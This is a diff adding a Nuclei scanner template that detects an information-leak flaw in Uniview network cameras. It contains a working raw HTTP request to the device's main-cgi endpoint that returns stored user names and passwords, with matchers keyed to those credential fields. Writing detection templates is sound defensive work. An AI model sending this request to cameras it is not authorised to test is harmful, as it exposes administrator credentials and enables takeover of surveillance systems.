@@ -1,0 +1,28 @@
+id: uniview-main-cgi-info-leak
+info:
+  name: Uniview Video Monitor System Information Leakage
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Uniview high-definition network camera has an information leakage vulnerability. Attackers can decrypt the leaked information to obtain administrator account passwords, log in to the background and control the entire system, putting the system in an insecure state.
+  tags: information-disclosure, camera
+  reference:
+    - https://cn.uniview.com/Service/Service_Training/Download/Tools/Front_End/
+http:
+  - raw:
+      - |
+        GET /cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Scanner
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "UserPass="
+          - "UserName="
+          - "RvsblePass="
+      - type: status
+        status:
+          - 200
